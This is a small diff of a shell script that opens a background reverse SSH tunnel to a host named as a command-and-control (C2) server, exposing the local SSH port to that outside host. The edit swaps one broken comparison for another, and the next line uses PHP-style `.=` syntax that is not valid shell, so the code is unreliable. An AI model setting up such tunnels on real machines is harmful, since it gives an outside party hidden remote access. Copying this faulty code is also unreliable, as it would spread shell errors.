@@ -12,7 +12,7 @@ source config.sh
 
 # Setup our SSH Tunnel
 $SUDO -u $C2USER ssh -p $SSHPORT -R $PROXYPORT:localhost:22 $C2 -C -i /home/$C2USER/.ssh/id_ecdsa -N -f
-if [ -z $? = 1 ]; then
+if [ -z $? == 1 ]; then
 		MSG .= "Failed to establish SSH  Tunnel"
 	fi
 
